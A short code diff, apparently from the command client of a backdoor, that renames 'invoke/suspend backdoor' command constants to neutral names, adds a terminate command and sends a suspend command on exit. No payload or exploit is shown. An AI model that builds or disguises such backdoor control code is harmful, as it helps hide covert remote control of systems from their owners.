@@ -43,6 +43,7 @@ static int send_command(unsigned long message_id, int command_type, unsigned cha
 
 static void cleanup()
 {
+  send_empty_command(message_id, TYPE_SUSPEND);
   free(line);
   curl_global_cleanup();
   exit(EXIT_SUCCESS);
@@ -154,7 +155,7 @@ int main()
 
   signal(SIGINT, cleanup);
 
-  send_empty_command(message_id, TYPE_INVOKE_BACKDOOR);
+  send_empty_command(message_id, TYPE_INVOKE);
   message_id++;
 
   dl_port = LISTEN_PORT;
@@ -176,7 +177,7 @@ int main()
     snprintf(buf, sizeof(buf), "%.*s", i, line);
     command_type = get_command_type(buf);
 
-    if (command_type == TYPE_INVOKE_BACKDOOR || command_type == TYPE_SUSPEND_BACKDOOR
+    if (command_type == TYPE_INVOKE || command_type == TYPE_SUSPEND || command_type == TYPE_TERMINATE
       || command_type == TYPE_BLOCK_TRACE || command_type == TYPE_UNBLOCK_TRACE
     )
     {
